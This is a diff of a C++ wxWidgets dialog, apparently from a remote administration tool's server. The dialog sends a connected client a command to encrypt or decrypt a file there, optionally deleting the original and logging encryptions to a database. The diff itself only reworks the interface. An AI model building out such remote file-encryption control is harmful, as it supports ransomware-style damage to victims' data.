@@ -16,38 +16,42 @@ frameEncryption::frameEncryption(wxWindow* pParent, std::string _strPath, std::s
 	this->strID = _strID;
 	this->strIP = _strIP;
 	this->sckCliente = _sck;
-	
-	wxArrayString selection;
-	selection.Insert("Encriptar", 0);
-	selection.Insert("Desencriptar", 1);
-	this->rdio_Options = new wxRadioBox(this, EnumIDS::ID_FM_Radio_Encriptar, wxEmptyString, wxDefaultPosition,
-		wxDefaultSize, selection, 0, wxRA_SPECIFY_COLS);
 
+	this->radioEncrypt = new wxRadioButton(this, EnumIDS::ID_FM_Radio_Encriptar, "Encriptar", wxDefaultPosition, wxDefaultSize, wxRB_GROUP);
+	
+	this->radioDecrypt = new wxRadioButton(this, EnumIDS::ID_FM_Radio_Desencriptar, "Desencriptar");
+	
+	wxBoxSizer* sizerops = new wxBoxSizer(wxHORIZONTAL);
+	sizerops->Add(this->radioEncrypt, 0, wxALL, 5);
+	sizerops->Add(this->radioDecrypt, 0, wxALL, 5);
+
+	
 	wxStaticText* lbl_File = new wxStaticText(this, wxID_ANY, "Archivo: " + this->p_strPath);
-	wxStaticText* lbl_Pass = new wxStaticText(this, wxID_ANY, "Contraseña");
+	wxStaticText* lbl_Pass = new wxStaticText(this, wxID_ANY, "Contraseña (longitud por defecto de 40)");
 	wxButton* btn_Random_Pass = new wxButton(this, EnumIDS::ID_FM_BTN_Random, "Generar contraseña");
-	wxButton* btn_Exec = new wxButton(this, EnumIDS::ID_FM_BTN_Crypt_Exec, ">>>");
+	wxButton* btn_Exec = new wxButton(this, EnumIDS::ID_FM_BTN_Crypt_Exec, "Ejecutar");
 	this->chk_del = new wxCheckBox(this, EnumIDS::ID_FM_Del_Check_Crypt, "Eliminar una vez sea cifrado/descifrado");
 
 	this->txt_Pass = new wxTextCtrl(this, EnumIDS::ID_FM_Text_Password);
 
+	wxBoxSizer* sizerRandomPass = new wxBoxSizer(wxHORIZONTAL);
+	sizerRandomPass->Add(this->txt_Pass, 1, wxALL, 1);
+	sizerRandomPass->Add(btn_Random_Pass, 0);
+
 	wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
 	
 	sizer->Add(lbl_File, 0, wxEXPAND, 1);
-	sizer->Add(this->rdio_Options, 0, wxEXPAND, 1);
+	sizer->Add(sizerops, 0, wxALL, 1);
 	sizer->AddSpacer(10);
 	sizer->Add(this->chk_del, 0, wxEXPAND, 1);
 	sizer->AddSpacer(10);
 	sizer->Add(lbl_Pass, 0, wxEXPAND, 1);
-	sizer->Add(this->txt_Pass, 0, wxEXPAND, 1);
-	sizer->AddSpacer(10);
-	sizer->Add(btn_Random_Pass, 0, wxEXPAND, 1);
-	sizer->AddSpacer(20);
+	sizer->Add(sizerRandomPass, 1, wxALL | wxEXPAND, 1);
 	sizer->Add(btn_Exec, 0, wxEXPAND, 1);
 
 	this->SetSizerAndFit(sizer);
 
-	this->SetClientSize(400, 150);
+	//this->SetClientSize(400, 150);
 
 	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
 }
@@ -79,7 +83,7 @@ void frameEncryption::OnGenerarPass(wxCommandEvent& event) {
 }
 
 void frameEncryption::OnExecCrypt(wxCommandEvent& event) {
-	std::string strComando = (this->rdio_Options->GetSelection() == 0) ? "0" : "1";
+	std::string strComando = this->radioEncrypt->GetValue() ? "0" : "1";
 	strComando += this->chk_del->IsChecked() ? "1" : "0";
 	strComando.append(1, CMD_DEL);
 	strComando += this->p_strPath;
@@ -89,7 +93,7 @@ void frameEncryption::OnExecCrypt(wxCommandEvent& event) {
 	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::FM_Crypt_Archivo);
 
 	//Agregar a BD si es para cifrar
-	if (this->rdio_Options->GetSelection() == 0) {
+	if (this->radioEncrypt->GetValue()) {
 		time_t temp = time(0);
 		struct tm* timeptr = localtime(&temp);
 
